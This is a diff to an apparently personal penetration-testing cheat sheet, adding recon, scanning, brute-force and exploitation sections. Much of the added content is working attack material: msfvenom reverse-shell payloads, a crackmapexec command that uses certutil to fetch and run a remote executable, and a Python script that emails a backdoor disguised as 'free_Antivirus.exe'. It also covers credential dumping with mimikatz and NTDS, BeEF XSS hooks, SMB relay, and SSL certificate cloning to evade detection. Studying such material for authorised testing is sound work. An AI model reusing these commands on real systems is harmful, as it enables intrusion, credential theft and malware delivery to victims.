@@ -7,10 +7,16 @@
   - [Sublist3r-DNS-Enumeration](#sublist3r-dns-enumeration)
   - [Passive-Active-Reconnaisance](#passive-active-reconnaisance)
   - [Discovery-Domain-Subdomain](#discovery-domain-subdomain)
+  - [Google-Dorks](#google-dorks)
+  - [TheHarvester](#theharvester)
+  - [Cache-and-Archives](#cache-and-archives)
+  - [NSLookup-DNS-Enum](#nslookup-dns-enum)
+  - [DIG-DNS-Enum](#dig-dns-enum)
 - [WIRESHARK](#wireshark)
   - [Sniffing-HTTP-vs-HTTPS](#sniffing-http-vs-https)
   - [PacketWhisper](#packetwhisper)
   - [Egresscheck-Framework](#egresscheck-framework)
+- [TCPDUMP](#tcpdump)
 - [RDR-Xfreerdp](#rdr-xfreerdp)
 - [TOOLS](#tools)
   - [NC-Netcat](#nc-netcat)
@@ -62,6 +68,7 @@
   - [Log4Shell](#log4shell)
   - [Wordpress](#wordpress)
   - [Jenkins](#jenkins)
+  - [BeEF-XSS](#beef-xss)
 - [SYSTEM-ATTACKS](#system-attacks)
   - [Malware](#malware)
   - [Password-Attacks](#password-attacks)
@@ -90,10 +97,16 @@
     - [MAC-Flooding-Spoofing](#mac-flooding-spoofing)
   - [ARPspoof](#arpspoof)
   - [Metasploit](#metasploit)
+    - [PERSISTENCE](#persistence)
+    - [SSL-Cert-Impersonation](#ssl-cert-impersonation)
   - [Impacket](#impacket)
     - [PSExec](#psexec)
+    - [SMB RELAY](#smb-relay)
   - [Port-Forwarding-Tunnelling](#port-forwarding-tunnelling)
+    - [Proxychains](#proxychains)
   - [SOCAT-Tool](#socat-tool)
+  - [SNMP](#snmp)
+  - [RESPONDER](#responder)
 - [SHELLS-FIND](#shells-find)
   - [Spawn-Stabilise-Shell](#spawn-stabilise-shell)
   - [Shell-Meterpreter](#shell-meterpreter)
@@ -142,10 +155,12 @@
   - [Service-Exploits](#service-exploits)
   - [NFS-Network-File-Sharing](#nfs-network-file-sharing)
   - [Passwords-and-Keys](#passwords-and-keys)
+  - [Linux-Compiling-Exploits](#linux-compiling-exploits)
 - [Windows-Privilege-Escalation](#windows-privilege-escalation)
   - [Info-Gathering](#info-gathering)
-  - [WinPEAS-PowerUp](#winpeas-powerup)
-  - [Windows-Exploit-Suggester](#windows-exploit-suggester)
+    - [PowerSploit](#powersploit)
+    - [WinPEAS](#winpeas)
+    - [Windows-Exploit-Suggester](#windows-exploit-suggester)
   - [Vulnerable-Software](#vulnerable-software)
   - [DLL-Hijacking](#dll-hijacking)
   - [Unquoted-Service-Path](#unquoted-service-path)
@@ -153,9 +168,12 @@
   - [Registry](#registry)
   - [Pass-The-Ticket](#pass-the-ticket)
   - [Token Impersonation](#token-impersonation)
-  - [Applocker Bypass](#applocker-bypass)
+  - [Applocker-Bypass](#applocker-bypass)
+  - [Nishang-Scripts](#nishang-scripts)
 - [Working-with-Exploits](#working-with-exploits)
   - [Linux-Exploits](#linux-exploits)
+  - [Pass-The-Hash](#pass-the-hash)
+  - [Backdoors](#backdoors)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -330,7 +348,141 @@ Using open source resources to do your discovery is a great way of understanding
   > - ![](https://i.imgur.com/lflAtZA.png)
   
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## Google-Dorks
+
+Using specific queries to return info that we directly want to chase. 
+
+The following is just a few of them:
+
+```powershell
+#DORKS
+    cache:$website             :Show 'cached' content 'typed into address bar'
+    link:$website              :Display websites that 'have links' to the specific website
+    site:$website              :Limit to website only
+    filetype:$extension        :Limit to filetype extension
+```
+
+---
+
+## TheHarvester
+
+Recon information, the harvester is able to enumerate email accounts, usernames, domains and hostnames through search engines and social networks such as google, bing, linkedin and so forth.
+
+[Download from Github](https://github.com/laramies/theHarvester)
+
+**Note:**
+- Different search engines return different results; important to test again google, bing, linkedin and so forth.
+
+```powershell
+#USAGE
+    theharvester -d $website -l $limit -b $source
+    theharvester -d elearnsecurity.com -l 100 -b google
+```
+
+---
+
+## Cache-and-Archives
+
+Webpages caught with archival tools such as [Archive.org](www.archive.org) allowing a simple search of a domain and then navigating between different dates and versions of that domain.
+
+Additionally, this would also be achieved using **Google Dorks** with the `cache:$website` dorks.
+
+---
+
+## NSLookup-DNS-Enum
+
+Tags: [DIG](#DIG)
+
+Query DNS records using NS lookup to check on domain names that might lead to information such as IP addresses
+
+**Note:**
+- nslookup is universal for operating systems however nslookup does have limitations with Linux, thereby you can use both nslookup and dig to perform same functions
+
+Alternative, using [DNS Dumpster](www.dnsdumpster.com) for some automation.
+
+```powershell
+#DNS LOOKUP
+    nslookup target.com   :Resolve a hostname to an IP address
+
+#REVERSE DNS
+    nslookup -type=PTR $IP        :Receive IP address to a given domain name
+
+#DISCOVER NAME SERVER
+    nslookup
+    server $RHOST         :IP address on DNS server with open port 53
+    set q=NS
+    $domain               :i.e 'foocampus.com'
+    #Output: DNS DOMAINS i.e ns1.foocampus.com
+
+    nslookup -type=NS $domain.com         :Alternative one liner
+    
+#QUERY: NAME SERVER IPs
+    nslookup
+    server $RHOST
+    $DNSname servers           :i.e 'ns1.foocampus.com'
+    #Output: IP ADDRESS
+
+#QUERY: MX RECORD
+    nslookup
+    server $RHOST
+    set q=MX
+    $domain               :i.e 'foocampus.com'
+    #Output: MAIL SERVER ADDRESS
+
+    nslookup -type=MX $domain.com         :Alternative one liner
+
+#ZONE TRANSFER
+    #Alternatively done with [DIG](#DIG) which runs better with LINUX, whereas nslookup does not have limitations with Windows
+    nslookup
+    server $NAMEserver         :For $domain.com
+    ls -d $domain.com
+```
+
+---
+
+## DIG-DNS-Enum
+
+Tags: [NSLookup](#NSLookup)
+
+Using dig to gather DNS information. Useful for diagnosing DNS issues but mainly used to enumerate on DNS info
+
+**Note:**
+- nslookup is universal for operating systems however nslookup does have limitations with Linux, thereby you can use both nslookup and dig to perform same functions
+
+Alternative, using [DNS Dumpster](www.dnsdumpster.com) for some automation.
+
+```powershell
+#DNS LOOKUP
+    dig $domain.com            :Resolve a hostname to an IP address
+    dig $ns.domain.com         
+    dig $pop3.domain.com
+
+#REVERSE DNS
+    #Determine if other subdomains on same IP
+    dig $domain.com PTR        :Receive IP address to a given domain name
+    #BING SEARCH - Has a query filter
+    ip:$IP
+
+#DISCOVER NAME SERVER
+    dig $domain.com NS         :Alternative one liner
+
+#QUERY: MX RECORD
+    dig $domain.com MX         :Alternative one liner
+
+#ZONE TRANSFER
+    #Zone transfers are result of misconfigured DNS servers; if required then should only be for trust IP addresses. If open to everyone then it's possible to enumerate the whole zone
+    dig @$RHOST $DOMAIN -t AXFR +nocookie
+    dig @10.50.96.5 foocampus.com -t AXFR +nocookie
+```
+
+
+
+
+
+
+
 
 
 # WIRESHARK
@@ -373,6 +525,7 @@ http                                    :**HTTP**
 http.request.method == GET              :
 dns.qry.type == 16                      :Filter DNS query to TXT  [Wiki](https://en.wikipedia.org/wiki/List_of_DNS_record_types)
 ftp-data
+http.authbasic
 
 #EXAMPLES
 tcp contains youtube                    :Filter specific address
@@ -488,7 +641,30 @@ $Target$
 
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+# TCPDUMP
+
+TCPDUMP is another packet sniffer that can analyse and save network traffic to a file.
+
+```powershell
+#PING TEST
+    sudo tcpdump -i tun0 icmp               :Setup to listen for ICMP pings, useful for testing connection call backs on exploit vectors
+
+#USAGE
+    sudo tcpdump -i tun0                    :Setup listener on specific NIC for incoming traffic
+    sudo tcpdump -i tun0 -xxAXXSs 0 dst $IP :Info Dump and filtering for specific traffic only
+    sudo tcpdump -i tun0 -vvvASs 0 dst $IP  :Reduced info grabbed but increased verbosity on remaining grabs and filtering for specific traffic only
+```
+
+**Verbosity Options**
+
+Using the verbosity option and the information that will be displayed; displays credentials that are base 64 encoded.
+
+![](https://i.imgur.com/UGlcIJD.png)
+
+
+
 
 # RDR-Xfreerdp
 
@@ -793,10 +969,17 @@ Additionally you have the likes of **vulnerability scanners** that use a databas
 
 Nessus has a *client* and *server* component. The *client* will configure the scans and the *server* will perform the scanning processes and report back to the client.
 
-|                              | Description                           |
-|:---------------------------- |:------------------------------------- |
-| `sudo service nessusd start` | starts the nessus service             |
-| `https://localhost:8834`     | web browser UI for the nessus service |
+```powershell
+#INSTALL
+    sudo apt install -f ./nessus.deb
+    sudo systemctl enable nessusd
+    sudo systemctl start nessusd
+    systemctl status nessusd.service          :Check if running correctly
+
+#ACCESS WEBPAGE INTERFACE
+    https://hdy:8834 or localhost:8834
+```
+
 
 **VULNERABILITY SCANNER PROCESS:**
 
@@ -958,25 +1141,48 @@ The goal of port scanning/service detection is the find the software name and ve
     -sS         : "SYN SCAN" packet, default scan unless specified; stealthy scan but slightly less info compared to "TCP CONNECT"
     -sU         : "UDP SCAN" packet
 
+#PING SWEEP
+    nmap -T4 -sn $RHOST                           :'ping sweep' to discover host or hosts on network 0/24 and so on; can be used with $FILE instead that contains numerous networks
+    nmap -T4 -n -sn -PS 22,135,443,445 $RHOST     :'syn packet ping sweep' to discover hosts with single 'syn packet'.
+
 #TCP SCANS
     nmap -T4 -sV -sC -oN $FILE $RHOST       : Version, script scan
     nmap -T4 -A -p- $RHOST                  : Aggressive scan, all options
     nmap -T4 -Pn -p- -n -sV $RHOST -v       : Quick Scan
-    nmap -sn $RHOST/24                      : Ping sweep i.e 192.168.99.0/24 to ping all on network and discover hosts, can be used with $FILE instead that contains numerous networks
     nmap -T4 -O -sT $RHOST                  : OS detection, using TCP CONNECT scan for accuracy
     nmap --traceroute $RHOST                : Discover Amt of ROUTERS between attacker and victim
 #UDP
-    nmap -sU --top-ports -sC --script-timeout 5m $RHOST                       : UDP scan, only top 10000 ports and limiting script timeout
-    nmap -sU -T4 -Pn -n -p- -vv --open --max-retires 1 --min-rate 1000 $RHOST : Full 65535 port scan, only open ports and limit probing retries and speed the scan up
+    nmap -sU --top-ports -sC --script-timeout 5m $RHOST                        : UDP scan, only top 10000 ports and limiting script timeout
+    nmap -sU -T4 -Pn -n -p- -vv --open --max-retires 1 --min-rate 1000 $RHOST  : Full 65535 port scan, only open ports and limit probing retries and speed the scan up
     nmap -sU -T4 -Pn -A --top-ports 100 
+    nmap -sU -T4 -p 53 -n 10.50.96.0/23                                        :'DNS Discovery' scan on UDP, port 53 known for UDP
 
 #FIREWALL
-    nmap -sF $RHOST  : Sends "FIN" flag, used against 'stateless firewall' that checks for "SYN" flags
-    nmap -sX $RHOST  : Xmas scan, sends "FIN PSH URG" simultaneously, useful for systems with 'stateless firewall'
-    nmap -sA $RHOST  : Uncommon scan, only useful is small set situations to discover 'firewall' rule sets and config; does not work in normal setups.
+    nmap -sF $RHOST                               :Sends "FIN" flag, used against 'stateless firewall' that checks for "SYN" flags
+    nmap -sX $RHOST                               : Xmas scan, sends "FIN PSH URG" simultaneously, useful for systems with 'stateless firewall'
+    nmap -sA $RHOST                               :Uncommon scan, only useful is small set situations to discover 'firewall' rule sets and config; does not work in normal setups.
+    nmap -T4 -n -sn -PS 22,135,443,445 $RHOST     : -PS effective for firewalls blocking pings, 'syn packet ping sweep' to discover hosts with single 'syn packet'.
+    nmap -sS -f $RHOST                            :Fragmented scan with packets split up to avoid older IDS  
     
 #STEALTH SCANS
-    nmap -sN $RHOST : Send "NULL" packets, less likely for IDS to pick up but limited info gathered
+    nmap -sN $RHOST    :Send "NULL" TCP scan packets, less likely for IDS to pick up but limited info gathered
+
+#ZOMBIE-IDLE SCAN
+    #Using a zombie host to scan another target, inspecting the IP FragID for incrementation
+    #DISCOVER
+    nmap --script ipidseq $RHOST -p $RPORT                      :Use in NSE to discover zombie, looking for 'incremental'
+    hping3 -S -r -p 135 10.50.97.10                             :Using Hping3 to discover if 'incremental'.
+    nmap -O -v -n $DiscoverZombie                               :Target potential candidate zombies, determine if the IP ID sequence generation is 'incremental'
+    
+    #USAGE
+    nmap -Pn -sI $ZOMBIEip:$PORT $Target -v -p $PORT            :Using 'zombie' to ping the 'target' and return info on open ports
+        #Hping3
+        hping3 -S -r -p 135 10.50.97.10                         :setup listening against 'zombie' ip
+        hping3 -a $ZOMBIEip -S -p 135 $Target                   :use and check increments, if id=+2 then port open, if id=+1 then closed
+
+#SOURCE PORT
+    #Sometimes DNS only accepts Comms from port 53
+    nmap --source-port 53 -p 53 10.50.96.0/23           :Sending packets from port 53 to port 53
 
 #IP FILTER TECHNIQUES
     192.168.99.0-139,141-255                            : To filter out your machine (i.e if your machine is ...140)
@@ -990,6 +1196,10 @@ The goal of port scanning/service detection is the find the software name and ve
     
 
 ```
+
+**Example of Zombie-Idle scan with Hping3**
+
+![](https://i.imgur.com/5JRHqMI.png)
 
 **NOTES**:
 
@@ -2267,14 +2477,14 @@ In theory we can display any readable file on the system if the code doesn't hav
 
 ```php
 <?php
-  include($_GET["file"]);
+  include($_GET["file"]); #variable is 'file' and allows $_GET on this parameter 'file' so able to use file=/etc/passwd
 ?>
 ```
 
 > - There is no directory specified in the `include` function and no user input validation
 > - The URL {http://webapp.net/index.php?file=welcome.php} and changing it around {http://webapp.thm/get.php?file=/etc/passwd/} to access the userlist of the site
 
-Code gets change:
+Code gets changed:
 ```php
 <?PHP 
 	include("languages/". $_GET['lang']); 
@@ -2283,6 +2493,18 @@ Code gets change:
 
 > - Now `include` function specifies directory /languages/ and indicates files from that directory with "."
 > - The URL {http://webapp.thm/index.php?lang=EN.php} and changing it to {http://webapp.thm/index.php?lang=/etc/passwd}
+
+**TESTING FROM LFI TO RFI**
+
+```powershell
+#SETUP LISTENER
+    nc -lvnp 80
+
+#TEST RFI
+    http://website.com/index.php?file=http://$LHOST/test        #Requires nc port 80
+    http://website.com/index.php?file=ftp://$LHOST/test         #Requires nc port 21
+    http://website.com/index.php?file=smb://$LHOST/test         #Requires nc port 445
+```
 
 **NULL BYTE %00 or 0x00**
 
@@ -3076,7 +3298,36 @@ Jenkins is another widely used web framework that we can exploit once we gain ac
 
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## BeEF-XSS
+
+Browser Exploitation Framework.
+
+[Link to Beef](https://beefproject.com/)
+
+```powershell
+#RUN
+    sudo /opt/beef/.beef          :Runs server, generates hook on all network interfaces
+
+#XSS
+    <script src="http://127.0.0.1:3000/hook.js"></script>
+    
+```
+
+Using it on a comment section, 
+
+![](https://i.imgur.com/PWjwKQk.png)
+
+Once a victim visits the blog you will find a new entry in the BeEF console. Your browser will be hooked too.
+
+![](https://i.imgur.com/QkuQ6oK.png)
+
+Host > Get System Info command within the "Commands" tab to get information about the browser, the OS and the plugins installed. Could potentially lead to an exploit such as **java_jre17_provider_skeleton** in this instance.
+
+![](https://i.imgur.com/UVsfAAY.png)
+
+
 
 # SYSTEM-ATTACKS
 
@@ -3303,7 +3554,34 @@ This file is then used to crack each users password.
 
 ## Buffer-Overflow
 
-Taking control of the execution flow of a piece of software or a routine of the operating system. Force the program to behave differently from the intended usage
+Taking control of the execution flow of a piece of software or a routine of the operating system. Force the program to behave differently from the intended usage. the term buffer is loosely used to refer to *any area in memory where more than one piece of data is stored*.
+
+The overflow occurs when we try to fill more data than the buffer can handle. Imagine a form requiring a last name but the field contains 5 characters only and the last name is 7 characters. As this data needs to go somewhere; the excess data **overwrites** any data that was in the **location** after the 5 characters. Take this example and imagine *the 2 excess characters* represented malicious code: this excess characters is **overwriting the original code** and placing the excess code (malicious code) into the program and **this procedure is then running our code** and allowing us to gain control of the program flow.
+
+![](https://i.imgur.com/jWxVDiF.png)
+
+![](https://i.imgur.com/NPSuqgr.png)
+
+The above diagram indicates such that the payload contains all **AAAA's** and the amount of **A's** is such that it overflows the *buffer, EBP, EIP and so forth* and you can see the content of all those addresses are being overwritten with **A's**. 
+The pentester will understand that the **EIP** points to the next instruction and an attacker can craft a payload that will get control of the program flow, then pass the next instruction as the malicious code.
+
+- EIP **Instruction** Pointer :- Points to the **next** **instruction**
+- 
+
+**Mitigation**
+
+- Maximum defense when ASLR / DEP is correctly implemented and enabled.
+- `strcopy` is a vulnerability function whereas using `strncopy` would be a safe implementation
+- `strcat; gets / fgets; scanf / fscanf; vsprintf; printf; memcpy` are all vulnerable and there are many others as well however this is **dependent on how the function is used**
+    - Does not properly validate inputs before operating
+    - Does not check input boundaries
+
+**Checking for ASLR**
+
+```powershell
+!mona modules               :Display modules properties on the program, confirming ASLR being active or not
+!mona noaslr                :Display modules with 'No ASLR'
+```
 
 **Buffer overflow attacks can lead to:**
 
@@ -3318,25 +3596,80 @@ Buffers have limit size and can only contain a set amount of data so if a develo
 
 This would lead to being exploited and *gaining control over the program **execution** **flow***.
 
-**Example of memory:**
 
-![](https://i.imgur.com/K7nQWy8.png)
-
-**Example of the stack, with buffer overflow into EIP:**
-
-![](https://i.imgur.com/ZgIcZw1.png)
 
 ### Seven-Steps-To-Buffer-Overflow:
 
-> - FUZZ the application, send a bunch of data and observe it's behaviour. Does it crash? if so...
-> - Use pattern_create and pattern_offset to generate a unique string and allows us to determine where the program is crashing
-> - Find out what is being written into the `EIP register`
-> - Generate shell code for the exploit (e.g msfvenom)
-> - Identify any bad characters: cannot be included in our payload
-> - Identify a `JMP ESP` anywhere in the program, that is usable in the exploit (No `DEP Data execution prevention` and No `ASLR address space layout randomisation` as we need a static space for the payload to reliably call on)
-> - Overwrite `IEP` with this memory address to jump to our shell code and execute it (**note:** little endian, backwards)
-> - **0xc9e45528 to \x28\x55\xe4\xc9** (the inverted structure of normally \xc9\xe4\x55\x28)
-> - The memory addresses need to be in the reverse order for buffer overflow
+**Consolidated Rhythm for Buffer Overflow**
+
+```powershell
+#SETUP
+    'Load Immunity Debugger'
+    'Run with Ctrl + F2 to reload, F9 to run'
+#Working Folder
+    !mona config -set workingfolder c:\mona\%p                             : Set working directory to be %P (gets replaced with name of .exe)
+
+#1 FUZZ
+    python3 fuzzer.py                                                      :From attacker host, find the limit where program crashes
+    #value: []
+
+#2 Cyclical Chars
+    msf-pattern_create      $value
+        'overwrite exploit payload'
+    python3 exploit.py
+
+#3 EIP
+    !mona findmsp -distance $value
+    !mona po $EIP                         :Alternative to findmsp
+    #offset: []
+        'overwrite exploit' $offset
+        'Set exploit'       $retn 'BBBB'
+    python3 exploit.py
+        'check EIP is 42424242'
+
+#4 Set Byte Array & Generate Bad Characters
+    !mona bytearray -b "\x00"
+    python3 gen_bad_chars.py
+        'overwrite exploit payload'
+    python3 exploit.py
+
+#5 Bad Chars
+    !mona compare -f c:\mona\$workingfolder\bytearray.bin -a esp
+    #badchars: []
+    
+        #Add to bytearray
+            !mona bytearray -b "\x00\x01"
+        #Remove from payload
+            '\x01'
+        
+        #Repeat until no bad chars
+            python3 exploit.py
+
+#JMP address
+    !mona jmp -r esp -cpb "\x00\x01"
+    #JMP:                           []
+    #Inverted JMP, formatted \x00\: []
+    'Overwrite exploit'      $RETN  'Inverted JMP'
+
+#7 Payload and Exploit
+    #Note architecture
+    msfvenom -p windows/shell_reverse_tcp LHOST=$RHOST LPORT=$RPORT EXITFUNC=thread -b "\$bad_char" -f c
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.19 LPORT=1234 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a"
+    msfvenom -p linux/x86/shell_reverse_tcp lhost=10.4.42.21 lport=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
+        'overwrite exploit' $payload = ('msfvenom')
+
+    #Padding
+        'overwrite exploit' $padding = "\x90" * 16
+
+    #Listener
+    nc -lvnp 4444
+
+    #Exploit
+    python3 exploit.py
+
+```
+
 
 ```powershell
 #SETUP
@@ -3348,6 +3681,7 @@ This would lead to being exploited and *gaining control over the program **execu
 #1 FUZZ
     python3 fuzzer.py                                                      :From attacker host, find the limit where program crashes
 ```
+
 
 **Step 1 Note:**
 
@@ -3702,6 +4036,89 @@ Finding usernames will narrow our bruteforcing down significantly and can lead t
 | ========================================= | =========================================                          |
 
 
+**Client-side Exploitation: Social Engineering**
+
+Sending an email with an attachment that will have a payload downloaded.
+
+Below python code requires a `fromaddr` and `toaddr` for the email address. Additionally it needs the payload or attachment to be within the same directory as the exploit
+
+```powershell
+#PAYLOAD
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -o backdoor.exe        :payload for the below code
+```
+
+```powershell
+#PYTHON3
+# Python code to illustrate Sending mail with attachments
+# from your Gmail account
+
+# libraries to be imported
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+fromaddr = "EMAIL address of the sender"                  #ie attacker@fake.net
+toaddr = "EMAIL address of the receiver"                  #ie victim@victim.com
+
+# instance of MIMEMultipart
+msg = MIMEMultipart()
+
+# storing the senders email address
+msg['From'] = fromaddr
+
+# storing the receivers email address
+msg['To'] = toaddr
+
+# storing the subject
+msg['Subject'] = "Subject of the Mail"
+
+# string to store the body of the mail
+body = "Body_of_the_mail"
+
+# attach the body with the msg instance
+msg.attach(MIMEText(body, 'plain'))
+
+# open the file to be sent 
+filename = "File_name_with_extension"                        #ie "free_Antivirus.exe"
+attachment = open("Path of the file", "rb")                  #ie. open("/root/backdoor.exe", "rb")
+
+# instance of MIMEBase and named as p
+p = MIMEBase('application', 'octet-stream')
+
+# To change the payload into encoded form
+p.set_payload((attachment).read())
+
+# encode into base64
+encoders.encode_base64(p)
+
+p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+# attach the instance 'p' to instance 'msg'
+msg.attach(p)
+
+# creates SMTP session
+s = smtplib.SMTP('smtp.gmail.com', 587)                       #requires smtp setup, ('demo.ine.local', 25)
+
+# start TLS for security
+s.starttls()
+
+# Authentication
+s.login(fromaddr, "Password_of_the_sender")
+
+# Converts the Multipart msg into a string
+text = msg.as_string()
+
+# sending the mail
+s.sendmail(fromaddr, toaddr, text)
+
+# terminating the session
+s.quit()
+
+```
+
+
 [Back to Top](#table-of-contents)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -3763,6 +4180,7 @@ Unlike offline cracking in system attacks, networks attacks rely on the ping lat
     -L $FILE         :Username LIST
     -p $PASS         :Pass
     -P $FILE         :Pass LIST
+    -u               :Loop around 'users'
     http-post-form   :Target parameter
     http-get-form    :Target parameter
     -e nsr           :Optional, attempts 'null', 'backwards' username as password
@@ -3782,11 +4200,32 @@ Unlike offline cracking in system attacks, networks attacks rely on the ping lat
     hydra -L $FILE -P $FILE http-get://$RHOST/
 
 #BASIC AUTH
-    hydra -e nsr -l $USER -P $FILE $RHOST -s $RPORT http-get /protected -I -V -t 30
+    hydra -e nsr -l $USER -P $FILE $RHOST -s $RPORT http-get /$path/to/login -I -V -t 30
+    hydra -L $FILE -P $FILE $RHOST http-get /$path/to/login -I -V -t 30
     
-#PROTOCOLS : ftp, telnet, ssh, http-get
-    hydra -L $FILE -P $FILE telnet://$RHOST
-    hydra -e nsr -l $USER -P $FILE ssh://$RHOST
+#BRUTEFORCE
+    #SMB
+        hydra -l $administrator -P $WORDLIST $RHOST smb -t 1 -V -I
+            #Users /usr/share/seclists/Usernames/top-usernames-shortlist.txt
+            #Pass /usr/share/seclists/Passwords/Common-Credentials/best15.txt
+    #RDP
+        hydra -l $administrator -P $WORDLIST rdp://$RHOST -t 1 -V -I
+    #LDAP
+        hydra -L $FILEusers -P $WORDLIST $RHOST ldap2 -V -I -t 30
+    #SNMP
+        hydra -P $WORDLIST $RHOST snmp -V -I -t 30
+    #FTP
+        hydra -L $FILE -P $FILE $RHOST ftp -V -I -t 30 
+    #SSH
+        hydra -L $FILE -P $WORDLIST $RHOST ssh -u -V -I -t 30
+    #POP3
+        hydra -l $USER -P $WORDLIST $RHOST pop3 -V -I -t 30
+    #SMTP
+        hydra -P $WORDLIST $RHOST smtp -V -I -t 30
+    #TELNET
+        hydra -L $FILE -P $FILE telnet://$RHOST -t 5
+    
+    
 ```
 
 **BEFORE AUTHENTICATION ATTACKS:**
@@ -3823,12 +4262,6 @@ Unlike offline cracking in system attacks, networks attacks rely on the ping lat
 ![](https://i.imgur.com/MCMA2wP.png)
   
 > - in this case, Username = username and Password = password
-
-[Back to Top](#table-of-contents)
-
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 
 [Back to Top](#table-of-contents)
 
@@ -3941,6 +4374,16 @@ crackmapexec $OPTION -L   :List all modules specific to $OPTION
     --pass-pol
     --ndts
     --groups
+    --continue-on-success
+    #DUMPS
+        --sam                    :Dump 'hashes'
+        --lsa                    :Dump 'LSA' secrets
+        --ntds                   :Dump 'ntds.dit' from target DCs includes all 'hashes'
+    #MIMIKATZ
+        -M mimikatz                                :use 'cme -M mimikatz --options' to display how to amend the default action by mimikatz
+        -M mimikatz -o COMMAND='privilege::debug'  :Returns '20' confirming administrator
+    #MET SHELL
+        -M met_inject -o SRVHOST=$LHOST SRVPORT=$LPORT RAND=4duPsc SSL=http
 
 #USAGE
     crackmapexec smb $RHOST -u '' -p ''                :Null Login
@@ -3949,10 +4392,15 @@ crackmapexec $OPTION -L   :List all modules specific to $OPTION
     crackmapexec smb $RHOST -u 'root' -p ''            :Commonly, first user in smb is root for linux and Administrator for windows
     crackmapexec smb $RHOST -u 'guest' -p ''           :Guest, low hanging fruit
     crackmapexec smb $RHOST -u 'Administrator' -p ''   :As above, this is specifically Administrator
-    crackmapexec smb $RHOST -u $FILEusers -p $FILEpass :Using FILES
     
-    crackmapexec smb $RHOST -u 'Administrator' -p '' -x $whoami   :Able to execute commands if successful and there are misconfigurations
-    crackmapexec smb $RHOST -u 'Administrator' -p '' -x 'type /path/flag.txt'
+    #BRUTEFORCE
+        crackmapexec smb $RHOST -u $FILEusers -p $FILEpass --continue-on-success        :Bruteforcing SMB login
+
+    #COMMANDS
+        crackmapexec smb $RHOST -u 'Administrator' -p '' -x 'certutil -urlcache -f http://$RHOST/rev1.exe rev1.exe && cmd /c rev1.exe'
+                        #msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.10.5 LPORT=4445 -f exe -o rev1.exe
+        crackmapexec smb $RHOST -u 'Administrator' -p '' -x $whoami                               :Able to execute commands if successful and there are misconfigurations
+        crackmapexec smb $RHOST -u 'Administrator' -p '' -x 'type /path/flag.txt'
 
 ```
 
@@ -4397,8 +4845,7 @@ Redirects packets from hosts on LAN intended for another host on LAN, by forging
 
 ## Metasploit
 
-Relational Tools:\
-[[#Msfvenom]], [[#Windows-Privilege-Escalation]], [[#Common Shell Payloads]], [[#Webshells]], [[#WEB-ATTACKS]], [[#PAYLOADS-SHELLS]]
+Tags: [Shell-Meterpreter](#Shell-Meterpreter), [Msfvenom](#Msfvenom), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), [Linux-Privilege-Escalation](#Linux-Privilege-Escalation)
 
 Metasploit is a tool with a wide array of community contributed exploits and attack vectors that can be used against various systems and technology.
 
@@ -4419,6 +4866,7 @@ use auxiliary/scanner/oracle/oracle_login	:Oracle
 use exploit/windows/local/persistence 		:Persistence/backdoor
 use exploit/multi/script/web_delivery		:WEB Delivery
 use exploit/windows/local/bypassuac 		:Bypass UAC
+use exploit/windows/local/bypassuac_dotnet_profiler    :Alternative bypass to UAC 
 use exploit/multi/http/jboss_maindeployer	:JBOSS
 use exploit/windows/mssql/mssql_payload		:MSSQL
 
@@ -4458,7 +4906,7 @@ creds_all		:Mimikatz, dump hashes with Mimikatz
 load powershell	:Select Powershell module
 ```
 
-**PERSISTENCE (backdoor):**
+### PERSISTENCE
 
 ```powershell
 #SETUP
@@ -4482,6 +4930,33 @@ You will notice the meterpreter connection will die due to reboot
 use exploit/multi/handler
 set $LHOST $LPORT
 set payload windows/meterpreter/reverse_tcp		:payload same as backdoor placed on victim
+```
+
+### SSL-Cert-Impersonation
+
+SSL-Cert-Impersonation-and-Detection-Evasion
+
+```powershell
+#MANUAL
+    [Manual script for cloning SSL Cert](https://github.com/SySS-Research/clone-cert/blob/master/clone-cert.sh)
+
+#MSFCONSOLE
+    use auxiliary/gather/impersonate_ssl
+        set rhost www.microsoft.com
+        run                                   :Creates combined .pem file, copy path to clipboard
+
+#MSFVENOM
+    handersslcert=$path/to/pem
+    stagerverifysslcert=true
+    
+    msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.10.10 lport=443 handlersslcert=/home/kali/.msf4/loot/20220209213123_default_104.119.101.162_104.119.101.162__957054.pem stagerverifysslcert=true -f exe -o shell.exe
+
+#MULTI/HANDLER
+    set lhost
+    set lport
+    set handlersslcert $path
+    set stagerverifysslcert true
+    set payload windows/x64/meterpreter/reverse_https
 ```
 
 [Back to Top](#table-of-contents)
@@ -4522,12 +4997,27 @@ sudo impacket-GetUserSPNs -dc-ip $RHOST -request $DOMAIN/$USER:$PASS` 				: call
 
 ### PSExec
 
+Tags: [Evil-Winrm](#Evil-Winrm)
+
 Using PSExec on SMB protocols to get execute commands such as a remote shell.
 
 ```powershell
 $DOMAINname         :Domain name i.e 'gatekeeper'
 
 impacket-psexec $DOMAINname/$USER:$PASS@$RHOST cmd.exe
+impacket-psexec administrator@10.10.10.10 -hashes $ntlmHash
+```
+
+### SMB RELAY
+
+Using SMB Relay to capture authentication in process and passing the hash
+
+```powershell
+#LISTENER
+    nc -lvnp 4444
+
+#IMPACKET
+    impacket-smbrelayx -h 192.168.88.132 -e shell.exe         :wait for 'target' host to start authentication with 'attacker'
 ```
 
 
@@ -4588,9 +5078,47 @@ http://localhost:$OPENPORT			:[Attacker], If successful then able to access the 
 For example: ssh > `-L 8111:localhost:8111` is telling the computer to listen on 8111, all traffic received through port 8111 on my kali, I want to send through the tunnel to come out on 8111 on the target. 
 ssh assumes the above as `localhost:8111:localhost:8111` but the above is just short hand.
 
+**Note**
